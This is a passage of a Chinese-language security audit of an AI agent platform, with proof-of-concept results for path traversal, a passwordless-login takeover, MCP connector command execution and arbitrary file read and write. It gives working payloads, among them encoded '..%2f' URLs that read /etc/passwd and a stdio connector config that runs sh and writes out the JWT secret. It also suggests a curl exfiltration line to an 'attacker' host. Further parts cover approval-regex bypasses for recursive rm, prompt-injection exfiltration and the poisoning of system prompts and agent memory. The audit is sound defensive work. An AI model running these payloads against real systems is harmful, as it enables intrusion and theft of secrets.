/..%2f..%2feasy_agent%2fconfig%2fconfig.yaml                   -> 200, 13260 bytes
/..%2f..%2fREADME.md                                           -> 200, 25826 bytes
```

- 还可读 `workspace/{任意用户}/…`、`sessions/{user}/…`、`tests/…`、`.git/config` 等；`os.path.join` 遇绝对路径丢弃前缀，**实测** `GET //etc/passwd`、`GET /%2Fetc%2Fpasswd` 同样 200（1472B，`/etc/passwd`）。
- 为什么 httpx/浏览器不会先归一化：`%2f` 是编码分隔符，URL 解析器不把它当 path separator；服务端 decode 后形成 `../`。nginx 部署时 `location /` 的 `try_files` 通常会先归一化/兜底，但 **docker-compose 将后端 8000 直接发布为 22332**，绕过 nginx（T3-19），k8s Service 内部访问同样可达。

### 3.3 T3-03 免密登录绕过（P0）

```python
# easy_agent/api/auth.py:231-241
cfg = get_agent_config()
policy = getattr(cfg.get("config"), "personnel", None) if cfg else None
if not getattr(policy, "passwordless_login_enabled", False):
    raise HTTPException(status_code=403, detail="当前环境未开启门户免密登录…")
if request.username == "admin":
    raise HTTPException(status_code=403, detail="admin 用户不支持免密登录")

user, created = db.get_or_create_passwordless_user(username=request.username, user_id=request.user_id)
...
new_version = db.increment_user_token_version(user.username, require_active=True)
access_token = create_access_token(data={"sub": user.username, "v": new_version}, ...)
```

```python
# easy_agent/db/database.py:2021-2023
existing = self.get_user_by_username(username)
if existing:
    return existing, False          # ← 已存在用户：user_id 完全不参与校验
```

- 活动配置 `easy_agent/config/config.yaml:159-161`：`passwordless_login_enabled: true`（**注意不是默认值**：`config-example.yaml` 与代码默认均为 false，属"部署配置打开了危险开关"）。
- 真机只读验证（无副作用）：`POST /agent/auth/login-passwordless {"username":"admin"}` → 403 `{"detail":"admin 用户不支持免密登录"}` —— 该文案只在"策略已开启"后才会出现（关闭时是"当前环境未开启…"），证明运行实例开关处于开启态。
- 隔离进程内（真实 app + 临时 SQLite）实测：

```
[PASS] passwordless_existing_user_login      HTTP 200
[PASS] passwordless_token_full_access        HTTP 200 profile=t3victim
[PASS] passwordless_creates_user_despite_registration_off  HTTP 200 user_exists=True
```

影响：未认证者只需知道/枚举用户名即可接管任意非 admin 账号（脚本化 POST，限流 20/min/IP 但仅进程内）；或用任意新用户名自建账号 → 获得完整 Agent 能力，进而触发 T3-04（RCE）/T3-05（任意读）/T3-01（Shell）。用户名字典来自人员工号/姓名，实际可枚举（T3-26）。修复优先：关闭开关；必须开启时改为校验外部 SSO 断言（HMAC/一次性 ticket，绑定 user_id 与时间窗），admin/管理员一律禁免密。

### 3.4 T3-04 MCP 连接器 → 宿主机 RCE + 环境变量外带（P0）

```python
# easy_agent/api/connectors.py:648-694（paste JSON add）→ 678 写盘 → 693 立即校验
user_mcp_path = _write_user_mcp_raw(username, config, raw)
...
"server_status": await _validate_servers(list(new_servers.keys()), username),
# easy_agent/api/connectors.py:132-137
client = MultiServerMCPClient({name: server_cfg})
tools = await client.get_tools()          # ← 对 transport=stdio 拉起 command/args 子进程
# easy_agent/services/mcp.py:161-163
data = json.load(f)
data = _expand_env_recursive(data)        # ← ${EASY_JWT_SECRET} 等被展开进用户配置
```

`langchain_mcp_adapters` 的 stdio transport 最终调用 `mcp.client.stdio.stdio_client` → `anyio.open_process(...)`（已核对 `.venv/.../mcp/client/stdio/__init__.py:251`），即**在服务进程所在主机、以服务 OS 用户执行用户提交的命令**，完全绕过 `easy_agent/sandbox.py` 的 bwrap/Landlock 设计。

隔离实测（真实 app，临时 workspace）：

```
[PASS] mcp_stdio_command_executed_on_host  HTTP 200 marker=True
   servers:{"t3poc":{"transport":"stdio","command":"sh","args":["-c","echo T3_MCP_RCE > /tmp/t3test/mcp_rce_marker"]}}
[PASS] mcpjson_expands_server_env_secrets  expanded_contains_secret=True      # ${EASY_JWT_SECRET}
[PASS] mcp_adapter_expand_env_vars         _expand_env_vars(${DEEPSEEK_API_KEY}) == os.environ 值
[PASS] mcp_raw_put_executes_and_exfiltrates_secret  marker=True secret_matched=True
   PUT /agent/connectors/mcp/raw {"content": {... "command":"sh","args":["-c","echo ${EASY_JWT_SECRET} > /tmp/t3test/secret_leak.txt"]}}
```

最直接的利用：`PUT /agent/connectors/mcp/raw` 写入 `bash -c 'curl -X POST --data-binary @/workspace/... https://attacker/'` 或 `env > /tmp/x` 即可外带密钥与用户数据；`get_connectors_status`/`list_connector_tools` 也会触发连接（无需等 Agent）。与 T3-03 组合 = 未认证 RCE；容器内 root（`Dockerfile` 无 `USER`）时影响进一步放大。

修复要点：连接器配置的 `command/args/env/cwd` 一律由服务端预置（目录白名单 id），用户只能填白名单 fields；自定义 server 仅允许 http/sse 且 URL 域名白名单；`_expand_env_recursive` 禁止作用于用户可控 mcp.json（或仅允许白名单变量名）；stdio 进程也须进沙箱/低权用户；保存与"测试连接"分离，测试动作需审计并限频。

### 3.5 T3-05 / T3-06 认证用户任意文件读取（P1）

```python
# easy_agent/api/files.py:282-300
@router.get("/download/{file_path:path}", summary="下载文件")
async def download_file(file_path: str, username: Annotated[str, Depends(get_current_username)]):
    upload_dir, workspace_dir = get_user_dirs(username)
    full_path = upload_dir / file_path          # ← 无 resolve / commonpath
    if not full_path.exists():
        full_path = workspace_dir / file_path
    if not full_path.exists():
        raise HTTPException(404, "文件不存在")
    return FileResponse(path=str(full_path), filename=os.path.basename(file_path), media_type="application/octet-stream")
```

```python
# easy_agent/api/files.py:316-322
@router.post("/parse", summary="解析文件内容")
async def parse_file(username: Annotated[str, Depends(get_current_username)], file_path: str = Query(...)):
    content = parse_file_content(file_path)     # ← 任意路径直接读
    return {"file_path": file_path, "content": content}
```

隔离实测（真实 app，Bearer token）：

```
[PASS] files_download_path_traversal        HTTP 200  first=root:x:0:0:root:/root:/bin/bash
[PASS] files_download_absolute_path_variant HTTP 200  (/agent/files/download//etc/passwd)
[PASS] files_download_cross_user_read       HTTP 200  (..x10 + tmp/t3test/workspace/otheruser/.../other-user-secret.txt)
[PASS] files_parse_arbitrary_path           HTTP 200  size=1541  （/etc/passwd 正文）
```

对比同文件 `resolve_workspace_file()`（`files.py:117-125`）已实现 `resolve()`+parents 前缀校验并用于 `preview`/定时任务文件，说明是漏用而非缺失能力。利用：读 `.env`（真实 key）、`data/easy_agent.db`（bcrypt 哈希/会话）、其他用户 workspace/sessions、docker env 文件；配合 T3-03 即未认证。

### 3.6 T3-07 未认证身份降级 + `target=pdf` 绕过（P1）

```python
# easy_agent/api/files.py:343-354
username = None
auth_header = request.headers.get("Authorization")
if auth_header and auth_header.startswith("Bearer "):
    username = verify_token_sso(auth_header[7:], db)
if not username and token:
    username = verify_token_sso(token, db)
if not username:
    default_user = db.get_or_create_default_user()   # ← 不 401，降级为 default（=admin）
    username = default_user.username

# easy_agent/api/files.py:366-389
full_path = workspace_dir / file_path                # ← 未 resolve
if not full_path.exists(): raise 404
if not full_path.is_file(): raise 400
if target and target.lower() == "pdf":
    pdf_path = convert_to_pdf(full_path, target="pdf")   # ← 任意路径转换
    return FileResponse(path=str(pdf_path), media_type="application/pdf", content_disposition_type="inline")
return serve_workspace_file(workspace_dir, file_path, download=bool(download))  # ← 此分支才有校验
```

隔离实测：

```
[PASS] preview_unauth_default_user_workspace   HTTP 200  (未认证读到 default(user=admin) 工作区文件)
[PASS] preview_unauth_existence_oracle         existing=400 missing=404
[PASS] preview_target_pdf_escapes_workspace    HTTP 200 type=application/pdf len=10823  (认证 + 相对穿越)
[PASS] preview_target_pdf_absolute_path_unauth HTTP 200 type=application/pdf len=10823  (未认证 + 绝对路径)
[PASS] preview_normal_branch_blocked_by_resolve HTTP 400  (普通分支被 resolve 拦截)
```

即：普通预览分支已被既有校验拦住，但 ① 无 token 时不应降级；② `target=pdf` 分支先转换后返回，完全绕过校验 → 未认证读取宿主机任意 Office 文档（本机 `soffice` 存在，实测生成 10.8KB PDF）。另：`get_or_create_default_user()` 实际返回 `admin`（`personnel/bootstrap.py:ensure_default_admin`），即降级到**最高权限内置账号**的工作区。

### 3.7 T3-08 未认证任意 `.md` 读写（P1）

```python
# easy_agent/api/prompts.py:42-55
@prompts_router.post("/read", summary="读取单个提示词文档")
def read_prompt(path: str = Query(...)) -> dict:
    prompts_base = _get_prompts_dir()
    md_path = os.path.join(prompts_base, f"{path}.md")     # ← 无穿越校验
    if os.path.exists(md_path):
        with open(md_path, "r", encoding="utf-8") as f: return {"content": f.read()}

# easy_agent/api/prompts.py:58-71
@prompts_router.post("/update")
def update_prompt(path: str = Body(...), content: str = Body(...)) -> str:
    md_dir = os.path.join(prompts_base, os.path.dirname(path))
    os.makedirs(md_dir, exist_ok=True)                      # ← 可创建任意目录
    md_path = os.path.join(prompts_base, f"{path}.md")
    with open(md_path, "w", encoding="utf-8") as f: f.write(content)   # ← 任意 .md 写
```

隔离实测：

```
[PASS] prompts_read_traversal_unauth            HTTP 200  (读到 prompts_base 外文件)
[PASS] prompts_update_arbitrary_md_write_unauth HTTP 200  wrote=True  body="[../pwn_t3]写入完成"
```

真机只读验证（未认证）：`POST /agent/prompts/read?path=../../home/sututu/code/easy-agent/README` → 200 并返回 README 正文（`logs/comm` 亦记录该请求）。写入影响：`prompts_base` 当前为 `/qts/prompts`（`.env.dev PROMPTS_DIR`），但 `../` 可写任意可写目录的 `.md`，包括 `easy_agent/config/prompts/system.md` / `fragments/*.md`（`prompt_loader.py` 的候选目录之一；重启后进入所有用户系统提示词）、`memories/{user}/AGENTS.md`（跨用户长期记忆投毒）、`workspace/{user}/skills/*/SKILL.md`（技能注入）。写操作无长度限制可填满磁盘。

### 3.8 T3-09 JWT 过期不生效 / 默认永不过期（P1）

```python
# easy_agent/middleware/auth.py:120-123
if auth_header and auth_header.startswith("Bearer "):
    token = auth_header[7:]
    payload = decode_access_token(token, verify_exp=False)   # ← 不校验 exp
# easy_agent/api/auth.py:63-71 + utils/auth.py:80-82
def _token_never_expires() -> bool:
    return agent_config["config"].agent.idle_logout_minutes == 0
...
if never_expires:
    to_encode.update({"iat": now})
    return jwt.encode(...)      # ← 无 exp 字段
```

隔离实测：

```
[PASS] expired_jwt_accepted_by_api  HTTP 200  exp_past=True  decode_verify_exp_true=None
[PASS] login_token_has_no_exp_claim claims=['iat','sub','v']
```

`config.yaml:62` 默认 `${IDLE_LOGOUT_MINUTES:-0}`，`.env.dev:38` 显式 `IDLE_LOGOUT_MINUTES=0`，运行实例为 dev → 无 exp token。即使配置了 idle>0，中间件仍 `verify_exp=False`，**exp 永远不会被检查**（`verify_token_sso`、`/profile`、知识库 principal 外的所有路径均如此；知识库 principal 用的是 `decode_access_token(token)` 默认 `True`，行为不一致）。后果：token 泄露即长期有效；30min 有效期名存实亡；与 FR-8「登录态失效/空闲超时」不符。修复：中间件 `verify_exp=True`（或显式比较 exp/iat），仅在"记住我"场景使用长期 refresh token + 服务端 jti 黑名单；知识库/主鉴权统一。

### 3.9 T3-10 / T3-18 凭据与本地暴露

- **git 已跟踪的真实口令**：`easy_agent/config/mcp.json:24` 的 `MYSQL_PASSWORD` 值（`Test****`），同一值出现在 `README.md:259`、`tests/test_config.yaml:61`；`git ls-files` 确认 mcp.json 已入库（commit `634bb81` 等）。虽然它是 dev 库口令，但属"真实凭据入库"，且该文件是**公共连接器目录**，用户点"安装 MySQL 连接器"会把该口令写入其 mcp.json。
- **工作区未跟踪密钥**：`.env`（644）含 `DEEPSEEK_API_KEY=sk-***`、`ARK_API_KEY=ark-***`、`WEB_SEARCH_API_KEY=tvly-dev-***`、`RAGFLOW_API_KEY=ragflow-***`、`MYSQL_PASSWORD`；`.env.dev` 含 `OPENCODE_API_KEY=sk-***` 等。`.gitignore` 已忽略（正确），但结合 T3-02（远程可读）与 T3-18（本地可读）仍有现实风险。
- **本地权限实测**：`logs/*.log`、`sessions/**/*.json`（全量对话）、`data/*.db`、`workspace/*` 均 644/755；`data/.jwt_secret` 600（正面）。`EASY_JWT_SECRET` 未在环境变量中设置（`/proc/85808/environ` 无该键），实际走 `data/.jwt_secret` 文件（600，正面），但 Web Terminal/RCE 以同用户身份可直接读。
- **人员默认密码 `123456`**：`personnel/repository.py:15/127/251`（手工新增/Excel 导入统一该口令）、`models.py:128` 响应回显；`api/auth.py:41` 默认重置口令 `123456` 并在 message 回显。`admin_reset_password`（`api/auth.py:463-493`）允许 `is_team_space_manager`（由知识库管理白名单写入，`knowledges/core/repository.py:222-238` 只要求 active+非 admin+有部门）把任意非 admin 用户重置为默认口令 → **非 admin 角色可批量接管普通账号**（横向越权）。
- 正面：`ensure_default_admin`（`personnel/bootstrap.py:11-29`）要求 `EASYAGENT_BOOTSTRAP_ADMIN_PASSWORD` ≥12 位且非常见弱口令，并在生产强制替换弱 admin 口令；`hash_password` 用 `bcrypt.gensalt()` 默认 cost 12。

### 3.10 沙箱专项（T3-15 及正面验证）

架构：`EasyAgent._build_backend`（`agent.py:543-637`）把 `/workspace/`（会话工作区）、`/memories/`（当前用户长期记忆）、`/user-skills/`（当前用户技能）、`external_dirs`（经 `fs_safety.py:16-34` 校验）映射到 `LocalShellBackend`；default backend 为 `_PathTranslatingShell(sandbox_enabled=config.agent.sandbox_enabled)`，`execute` 依次选择 bwrap → Landlock → fail-closed（`backends/shell.py:135-173`），确实**不会降级到宿主机裸跑**。隔离实测（真实 app 进程内，`sandbox_enabled=true`）：

```
[PASS] bwrap_runs_normal_command   OK（可见 /etc/hostname）
[PASS] bwrap_env_secret_sanitized  leaked=False（传入 EASY_JWT_SECRET/sk-t3-known 均未出现在 env / /proc/self/environ）
[PASS] bwrap_hides_host_paths      cat /tmp/t3test/outside.txt -> No such file（/tmp 为 tmpfs，/home 不可见）
[PASS] landlock_runs_normal_command LANDLOCK_OK
[PASS] landlock_hides_host_paths   cat 外部文件 -> Permission denied
[PASS] landlock_env_secret_sanitized leaked=False
```

与需求 FR-7.2 AC1/AC2/AC3 对齐（命令沙箱本身达标）。仍存在的中危缺口：

1. `--share-net`（`sandbox.py:148,193`）保留完整网络：提示注入可让 Agent 把工作区/上传文档 `curl` 外发、访问内网/云元数据；沙箱内虽无密钥，但用户文档本身可外带。建议默认 `--unshare-net`，需要联网搜索时走白名单代理。
2. 无资源限制：全代码无 `resource.setrlimit`；`execute` 仅 `timeout`（`agent.py:633` 默认 120s，模型可传至 `deepagents` `max_execute_timeout=3600`），无 CPU/内存/进程数/文件数限制；bwrap 有 PID ns 但内存 CPU 共享，**Landlock 回退连 PID ns 都没有** → fork 炸弹/内存打爆可拖垮宿主。
3. Landlock 回退把 `/etc` 整体只读映射（`sandbox.py:339-353` + `landlock.py:169-208`），不像 bwrap 那样 mask `/etc/environment`、`/etc/shadow` 等；`/opt` 亦只读可读。若宿主把凭据放 `/etc` 或应用部署在 `/opt`，回退路径可读（P3）。
4. bwrap 会 `--ro-bind-try /etc`（设计如此），`/etc/passwd` 等系统文件可读属预期；应用源码/配置在项目根（`/home/.../easy-agent`）不可见（正面）。
5. `sandbox.check_command_paths`（`sandbox.py:415-444`）是"无 bwrap 兜底白名单"的遗留实现，**生产代码无调用**（仅测试引用）；当前策略是 fail-closed，更强，但存在死代码与文档误导（"best-effort path allowlist fallback"注释已过时）。
6. 目录删除保护：`backends/shell.py:87-94` 在执行前用 `_is_directory_deletion` 拒绝 `rm -rf/rmdir/find -delete` 等；但正则绕过见 T3-16。`sandbox_enabled=false` 时 `super().execute()` 宿主机裸执行（`backends/shell.py:136-137`），仅在"可信单用户"可接受，建议加载时对非 dev 环境强制 fail-closed。

### 3.11 其它中危（T3-12 / 13 / 14 / 16 / 17）

- **T3-12 SSRF**：自定义连接器 `url` 用户可写并经服务端连接（`connectors.py:494 get_tools()`、`api/connectors.py:203-265 install`/`515-573 config` 的 `url`/`https`），可打内网/元数据；建议域名白名单+禁私网。
- **T3-13 上传限制**：`files.py:238-279 /upload` 无大小/类型限制（`await file.read()` 全量入内存，`write_bytes` 落盘）；`sessions.py:388-428` 先 `await file.read()` 再判 `max_file_size_mb`（413 在内存耗尽后才触发）；设计文档声明的 R2（数量）/R3（总大小）后端无实现（grep 仅 `settings.py` 下发与 config 校验），与 `docs/upload-limits-design.md` 第 11 章"已实施"不符。另：uvicorn 无 body 上限，仅 nginx 100m。
- **T3-14 SVG XSS**：`.svg` → `_MIME_MAP["image/svg+xml"]` + `content_disposition_type="inline"`（`files.py:43,142-147`）；API 响应未加 `X-Content-Type-Options`（`app.py:427-447` 只在 skip 分支加头）；实测：`GET /agent/files/preview?file_path=xss.svg` → 200 `image/svg+xml`、`inline`、无 `nosniff`。配合 `token` query（T3-17）可构造"一条链接"接管受害者账号（SVG 内脚本读取 localStorage 的 `mini_agent_token`）。
- **T3-16 HITL 正则绕过**（实测纯函数）：

```
'rm -rf /workspace/sub'                    dir_del=True  needs_approval=False → 执行层拒绝
'rm -f -r /workspace/sub'                  dir_del=False needs_approval=True  → 可批准后递归删目录
'rm -r -f /workspace/sub'                  dir_del=True  needs_approval=False → 拒绝
'rm --recursive /workspace/sub'            dir_del=False needs_approval=True  → 可批准后递归删目录
`python -c "import os; os.remove(...)"`    dir_del=False needs_approval=False → 无审批直接执行
'rm /workspace/file.txt'                   dir_del=False needs_approval=True  → 正常
```

HITL 对 `execute` 之外的高危动作（网络外发、写配置、安装依赖、`mv`/`truncate`/`dd`）无审批；`save_expert`/`create_scheduled_task`/`access_knowledge_original` 工具名与 `interrupt_on` 配置一致（已核对 `tools/expert_writer.py:253`、`tools/scheduled_task.py:45`、`HITL_SYSTEM_NOTE`），这部分配置正确。
- **T3-17 token 进日志**：`preview`/定时任务文件接口支持 `?token=`（`files.py:330`；`scheduled_tasks.py:225-228`），`initialization/log.py:23` 把 `uvicorn.access` 写入 comm 日志；实机 comm 日志行确认**记录完整 query string**（如 `"GET /agent/files/preview?file_path=… HTTP/1.1"`），`proc` 日志中另有 19 条含 `token=` 的 httpx 记录（pytest testserver 行）——即带 token 的预览请求会原样进日志。与 T3-09 组合 = 日志即长期凭据。

### 3.12 其它低危（T3-20~27 摘要）

- **T3-20 审计**：`observability.should_audit` 仅 `("/agent/knowledge/v1",)`，登录/登出/失败登录、文件下载/预览、terminal 建连、connector/prompt 写、专家变更均不入 DB 审计；审计写失败只告警；审计表在业务库可被删改。AC（FR-11「关键事件可查」）不满足。
- **T3-21 限流**：`_DEFAULT_RULES` 仅 4 条 path；进程内 `defaultdict(deque)`（多 worker/pod 独立计数）；key 用 `request.client.host`（不读 `get_client_ip`，nginx 后所有用户共享出口 IP → 20/min 全局限流误伤；且反而不受 XFF 伪造影响）；`raise HTTPException` 位于 `BaseHTTPMiddleware.dispatch`，**实测前 20 次返回 401、第 21 次起返回 500（429 从不出现）**（`TestClient(raise_server_exceptions=False)` 连续 25 次登录，状态码集合 `{401,500}`）。
- **T3-22 CORS/安全头/文档**：`environment.py:17-31` 在 `AGENT_ENV=prod` 且未设置 `EASY_CORS_ALLOW_ORIGINS` 时**启动失败**（正面）；但 dev 默认 `*`，实测 `Access-Control-Allow-Origin: *`（无 credentials），任意站点可跨域读取所有未认证接口（叠加 T3-02/08）。`/docs`、`/openapi.json` 实机 200 未授权；API 响应无 `X-Content-Type-Options/X-Frame-Options/CSP`（只有静态分支有）。
- **T3-23 IDOR**：`GET/POST /agent/connectors/session` 与 `POST /agent/chat/cancel` 未校验 session 归属（其余 chat/session/files 接口均校验）；需先获知 UUID session_id（T3-02 可读日志/DB 后具备条件）→ 篡改他人会话连接器开关/取消他人流式任务。
- **T3-24 受限穿越**：`add-skill` 的 `skills_root/dir_name`、`skill-detail(scope=public)` 的 `dir_name`、`find_public_expert(root/expert_id)` 未做 resolve/白名单（可读任意含 SKILL/README/任意 `.md` 的目录；`add-skill` 可拉取任意含 SKILL.md 目录）；`import-skill` 的 zip 校验（绝对路径/`..`/盘符/解压总量/条目数）实现正确（正面）。
- **T3-25 专家边界**：`expert_guardrail.py` 自述"提示词层面软约束"，`expert_relevance.detect_unsafe_request` 是关键词黑名单（"删除/重写/清空/rm -rf/drop table…"），且 `api/expert.py` 预检 **fail-open**（异常/超时放行）；专家会话的执行仍受沙箱+HITL 限制，但"专家不越界"并非硬保证。建议专家会话工具级禁用 `execute` 或仅保留只读工具。
- **T3-26 枚举/口令**：停用账号登录返回 403「账号已停用」而未知用户 401「用户名或密码错误」（实测 `disabled=403 / unknown=401`）→ 账号存在性枚举；密码 `min_length`=3/4 且无复杂度；用户不存在时无 bcrypt 计算（时序差）。修复：统一文案+恒定时间+策略。
- **T3-27 信息泄漏**：`files.py:273-279` 上传响应返回服务端绝对路径；`files.py:381-383` 转换失败 `detail=f"文档转换失败: {e}"` 携带 LibreOffice stderr（内部路径/版本）；`app.py:608-628` `/agent/config`、`/api/config` 未授权返回 provider/model；`global_exception_handler`（`app.py:529-537`）只返回"服务内部错误"+request_id（正面，不泄露堆栈）。
- **T3-19 部署**：`docker-compose.yml` 后端 `ports: "22332:8000"` 直接发布 + `env_file: .env.dev` + Dockerfile 无 `USER`（root）；k8s `agent-deployment.yaml:61-66` `capabilities.add: ["SYS_ADMIN"]`（bwrap 注释称无需 SYS_ADMIN）与 `readOnlyRootFilesystem: false`。后端直连使 T3-01/02/08 全部可被外部访问；建议后端仅内网 listen、去掉 publish、非 root、移除 SYS_ADMIN。

### 3.13 已验证的安全正面项（建议保留/写入验收）

1. 命令沙箱：bwrap 可用时完整隔离（工作区外不可见、env 白名单、`/etc/passwd` mask、HOME/TMP 重映射、`--die-with-parent`）；bwrap 不可用 → Landlock 文件系统隔离；二者皆无 → **fail-closed 拒绝执行**（`backends/shell.py:156-173`），符合 FR-7.2 AC3。实测隔离有效。
2. `sandbox.py:_sanitize_env` 白名单（`sandbox.py:64-101`）+ `run_landlocked` 只传脱敏 env；实测 `EASY_JWT_SECRET`/`DEEPSEEK_API_KEY` 未进入沙箱命令环境（AC2 达标）。
3. `fs_safety._check_external_dir_safety`（`fs_safety.py:16-34`）拒绝把工作区根/祖先/其他用户子树挂为外部目录，防"external_dirs 误配泄露所有用户"。
4. 会话/文件/专家/定时任务/技能等主业务接口普遍使用 `get_owned_session`/`user_id` 归属校验（`utils/session.py`、`db/expert_store.py:get_owned`、`scheduled_tasks.py:84-85`、`files.py:157,187,259`），跨用户 IDOR 面收敛良好（除 T3-23 两处）。
5. `X-Username` 回退已移除（实测 401），单点登录 `token_version` 机制正确（改密/登出/新登录踢旧 token），停用账号被拒。
6. 管理员 bootstrap 强制强口令（`personnel/bootstrap.py:11-15`）；bcrypt 默认 cost 12；JWT 密钥持久化文件 600（`data/.jwt_secret`），未设置 env 时多 worker 可共享。
7. `AGENT_ENV=prod` 时未配置 `EASY_CORS_ALLOW_ORIGINS` 直接启动失败（`initialization/environment.py:27-31`），防生产 `*`。
8. 技能 zip 导入校验完备（绝对路径/盘符/`..`/条目数/解压总量/`..` 目录项）；knowledge 上传有扩展名-MIME-魔数一致性与宏拒绝、可选 ClamAV（`knowledges/core/file_validation.py`）。
9. 全局异常处理器只回 `{"detail":"服务内部错误","request_id":...}`，不泄露堆栈/路径（`app.py:529-537`）。
10. `_is_directory_deletion` 在执行层拒绝递归删除（虽可绕过，见 T3-16）；`Directory deletion` 类命令不会被 HITL"批准即执行"。

### 3.14 与需求文档（`docs/requirements-agent.md`）对照

| 需求 | 结论 | 证据 |
|---|---|---|
| FR-7.2 AC1 沙箱内不可读工作区外宿主目录 | **命令沙箱内达标**（bwrap/Landlock 实测），但 Web Terminal/MCP/文件 API 是完全旁路 | §3.10 / T3-01/04/05 |
| FR-7.2 AC2 服务端密钥不进入沙箱 | **达标**（env 白名单+实测） | §3.10 |
| FR-7.2 AC3 无隔离时拒绝执行 | **达标**（fail-closed） | `backends/shell.py:156-173` |
| FR-8.1 除登录/健康检查外所有接口需鉴权 | **不达标**：terminal/prompts/preview/completion 未认证 | §3.0 矩阵 |
| FR-8.2 数据按用户隔离、操作前校验归属 | **主业务达标**，文件下载/解析/预览、connectors session、chat cancel 例外 | T3-05/06/07/23 |
| FR-8 登录态失效/空闲超时 | **不达标**：`verify_exp=False` + 默认无 exp | T3-09 |
| FR-11 可观测与审计（登录/任务/工具调用） | **部分**：仅知识库前缀入 DB 审计 | T3-20 / `observability.py:93-101` |
| 安全「最小权限/越界默认拒绝」 | 沙箱达标；HTTP 层多个缺口 | 本报告 P0/P1 |

---

## 四、不确定项 / 需 Lead 复核

1. **T3-02 经 nginx 是否可利用**：本次真机验证直连后端 8080；生产若只经 nginx，`location /` 的 `try_files` 与 nginx URI 归一化可能拦截 `..%2f`。但 docker-compose 直接发布后端 22332，且 k8s Service 内网可达 → 仍成立。建议 Lead 在 T5 用 nginx 前置环境复测一次。
2. **T3-03 配置归属**：`config.yaml` 是 gitignored 的本地文件；`config-example.yaml` 中该开关为 false。需确认生产/交付镜像实际使用的 config.yaml 是否也开启（Dockerfile `COPY easy_agent/` 未排除 config.yaml，存在把开发配置打进镜像的风险）。
3. **HITL `when` 谓词在 deepagents 0.6.8 的实际生效**：已核对 `langchain/agents/middleware/human_in_the_loop.py:146-194,356-382` 支持 `when`（`InterruptOnConfig` TypedDict），但 deepagents 是否原样传给 HITL 中间件属 T1 范围，T3-16 的"绕过"结论在"when 生效"前提下成立；若 `when` 未生效可能更严重（所有 execute 都审批）或更轻（均不审批），请 T1 交叉确认。
4. **Postgres checkpointer 下的跨会话 HITL**：`ResumeRequest.thread_id` 由客户端回传（`api/chat.py:673-708`），恢复时直接 `config={"configurable":{"thread_id": thread_id}}`（`streaming.py:1352`）。默认 per-session MemorySaver 下天然隔离；若启用 `EASY_CHECKPOINT_POSTGRES_URI`（共享 saver）且攻击者获知他人 `thread_id`（= `session_id-message_id`），理论上可恢复/篡改他人中断态——需 Lead 评估可达性（session_id 泄露路径：T3-02）。
5. **浏览器 PNA/CORS 组合**：dev `Access-Control-Allow-Origin: *` 下，恶意站点用 `fetch('http://127.0.0.1:8080/..%2f..%2f...')` 读取本机文件受 Chrome Private Network Access 策略影响（版本相关）；网络攻击者直连则无此限制。T3-14 SVG XSS 只需受害者点击链接即可，与 PNA 无关。
6. **知识库模块**：本部署 `knowledge.enabled=false`，knowledge 相关接口未纳入本次动态验证（principal 使用 `decode_access_token` 默认 verify_exp=True，反而比主鉴权严格；`_admin`/`is_team_space_manager` 角色模型只在静态审计中核对）。
7. **`/agent/files/preview` 的 default 用户**：`get_or_create_default_user()` 语义是"确保 admin 存在"（`personnel/bootstrap.py`）。若部署方另建了名为 default 的业务用户，语义需复核；当前实现下未认证可读的是 admin 工作区。
8. **`server.py`/uvicorn 版本对 path 参数的解码**：本次在 fastapi 0.136.3/starlette 实测编码斜杠穿越成立；若升级/替换 ASGI server 需回归 T3-02。

---

## 五、附录

### 5.1 PoC 材料（均不触碰业务数据）

- 隔离 PoC harness：`/mnt/c/Users/sutut/AppData/Local/Temp/easy-agent-audit/t3_poc.py`（WSL 内 `/home/sututu/code/easy-agent/.venv/bin/python` 运行；强制 `WORKSPACE_DIR/MEMORIES_DIR/SESSIONS_DIR/SQLITE_PATH/PROMPTS_DIR/SKILLS_DIR` 指向 `/tmp/t3test`，独立 SQLite，`EASYAGENT_BOOTSTRAP_ADMIN_PASSWORD` 随机化）。33 项检查全部 PASS，覆盖 T3-01/03/04/05/06/07/08/09/14/15/16/17 与沙箱正/负向、MCP env 展开。
- 只读真机脚本：`t3_live.sh` / `t3_live2.sh` / `t3_live3.sh` / `t3_live4.sh` / `t3_live5.sh` / `t3_live6.sh`（仅 GET/无害 POST（空 body 触发校验）、登录失败请求；未执行任何写业务数据的操作；`.env`/DB 仅取状态码与字节数，未落盘、未复制）。
- 运行环境：WSL2 Ubuntu-24.04，内核支持 Landlock，`/usr/bin/bwrap` 可用，`/usr/bin/soffice` 可用，运行中服务 `127.0.0.1:8080`（`main.py`，cwd=仓库根，`AGENT_ENV=dev`）。

### 5.2 关键代码位置速查

| 主题 | 位置 |
|---|---|
| 路由装配 / CORS / 静态兜底 / 全局异常 | `easy_agent/app.py:369-390, 422-467, 529-537, 540-555, 631-666` |
| 鉴权依赖 / token 校验 | `easy_agent/middleware/auth.py:88-151`；`easy_agent/utils/auth.py:22-102` |
| 登录/免密/重置/管理员 | `easy_agent/api/auth.py:41, 87-296, 402-493` |
| 免密建号/默认用户 | `easy_agent/db/database.py:2008-2043, 2065-2067`；`easy_agent/personnel/bootstrap.py` |
| 文件 API | `easy_agent/api/files.py:117-147, 238-322, 325-391` |
| 提示词 API | `easy_agent/api/prompts.py:15-71` |
| 连接器/MCP | `easy_agent/api/connectors.py:114-143, 203-265, 428-473, 599-694`；`easy_agent/services/mcp.py:111-203, 263-468` |
| 终端 | `easy_agent/api/terminal.py:225-364` |
| 沙箱 / Landlock / 权限 | `easy_agent/sandbox.py`、`easy_agent/landlock.py`、`easy_agent/backends/shell.py`、`easy_agent/fs_safety.py`、`easy_agent/agent.py:376-841` |
| HITL | `easy_agent/hitl.py`；`easy_agent/agent.py:467-493` |
| 会话归属 | `easy_agent/utils/session.py`；`easy_agent/api/sessions.py`；`easy_agent/api/chat.py:313-376, 631-721` |
| 限流 / 客户端 IP | `easy_agent/middleware/rate_limit.py`；`easy_agent/utils/client_ip.py` |
| 审计 / 日志 | `easy_agent/knowledges/runtime/observability.py`；`easy_agent/initialization/log.py` |
| 上传限额设计 | `docs/upload-limits-design.md`；`easy_agent/api/settings.py:235-262` |

### 5.3 立即处置建议（按顺序）

1. 关闭 `personnel.passwordless_login_enabled`（或改为 SSO 断言校验），并轮换 `.env*` 中所有真实 key、MySQL 口令。
2. 下线 Web Terminal（或加鉴权+Origin+低权 shell），后端端口不对外发布。
3. 修复 SPA 兜底路径穿越（realpath+拒绝 `..`），`files/preview|download|parse` 统一走 `resolve_workspace_file`，preview 无 token 直接 401。
